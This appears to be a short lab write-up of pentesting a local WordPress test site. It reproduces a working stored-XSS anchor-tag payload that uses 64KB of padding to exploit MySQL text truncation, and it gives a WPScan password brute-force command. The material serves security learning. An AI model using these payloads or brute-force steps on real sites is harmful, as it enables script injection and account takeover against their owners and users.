<h1> Wordpress Pentesting </h1>

<h3> Time: approx 14 hours </h3>

<h3> 1. Stored XSS </h3>
Discovered by Jouko Pynnönen of Klikki Oy  <a href=url>https://klikki.fi/adv/wordpress2.html</a> This site was used as a resource. I injected the anchor tag below into the a post. 
      
   <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px [64 kilobytes of Letters]’> </a>

  You need 64 kilobytes of letters due to the MYSQL text size limit being 64KB so I made that with this python command. <br>
      <strong> python -c 'print ("A"*65600)' > payload.txt </strong> <br>
  In vim you can open up payload.txt and use ":%+" to copy the entire file and then paste it where the letters go in the anchor tag payload.
      This script will be triggered when the comment is viewed.
      
 
   <h2> 2. Brute Force Login with WPScan and wordlist </h2>
      
      WPScan can ennumerate users and generate passwords if you use a wordlist.
      -use command: wpscan --url wpdistillery.vm -passwords passwords.txt
     

